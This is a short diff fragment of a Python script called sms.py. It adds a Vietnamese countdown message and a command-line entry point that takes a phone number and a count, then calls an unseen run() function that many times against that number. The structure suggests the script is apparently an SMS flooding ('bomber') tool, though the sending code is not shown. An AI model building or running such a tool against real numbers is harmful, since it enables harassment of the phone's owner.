+    for j in range(4, 0, -1):
+        print(f"Vui lòng chờ {j} giây", end="\r")
+        time.sleep(1)
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 3:
+        print("Usage: python sms.py <phone_number> <count>")
+        sys.exit(1)
+    
+    phone = sys.argv[1]  # Fetch phone number from command-line argument
+    count = int(sys.argv[2])  # Fetch count from command-line argument
+
+    for i in range(1, count + 1):
+        run(phone, i)
